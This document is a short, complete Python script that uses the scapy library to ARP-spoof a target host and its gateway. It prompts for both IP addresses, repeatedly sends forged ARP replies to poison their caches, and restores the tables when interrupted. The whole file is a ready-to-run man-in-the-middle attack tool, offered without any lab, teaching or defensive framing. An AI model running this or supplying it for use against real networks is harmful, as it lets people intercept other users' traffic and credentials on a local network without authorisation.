import scapy.all as scapy
import time
import sys

interval = 4
ip_target = input("Enter target IP address: ")
ip_gateway = input("Enter gateway IP address: ")


def get_mac(ip):
	"""Resolve MAC address for an IP and return None if not found."""
	mac = scapy.getmacbyip(ip)
	if mac is None:
		print(f"[!] Could not resolve MAC for {ip}. Host may be down or unreachable.")
	return mac


def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	if not target_mac:
		return
	# Build an Ethernet frame and ARP reply (is-at)
	arp = scapy.ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)
	ether = scapy.Ether(dst=target_mac)
	packet = ether/arp
	# send layer-2 frame
	scapy.sendp(packet, verbose=False)


def restore(destination_ip, source_ip):
	destination_mac = get_mac(destination_ip)
	source_mac = get_mac(source_ip)
	if not destination_mac or not source_mac:
		print(f"[!] Cannot restore ARP for {destination_ip} <- {source_ip} due to missing MAC.")
		return
	arp = scapy.ARP(op=2, pdst=destination_ip, psrc=source_ip, hwdst=destination_mac, hwsrc=source_mac)
	ether = scapy.Ether(dst=destination_mac)
	packet = ether/arp
	# send multiple times to ensure the table is corrected
	scapy.sendp(packet, count=5, verbose=False)


try:
	print(f"Starting ARP spoofing: {ip_target} <-> {ip_gateway} (interval={interval}s)")
	while True:
		spoof(ip_target, ip_gateway)
		spoof(ip_gateway, ip_target)
		time.sleep(interval)
		
except KeyboardInterrupt:
	print('\nInterrupted by user. Restoring ARP tables...')
	restore(ip_gateway, ip_target)
	restore(ip_target, ip_gateway)
	print('Restore completed. Exiting.')
	sys.exit(0)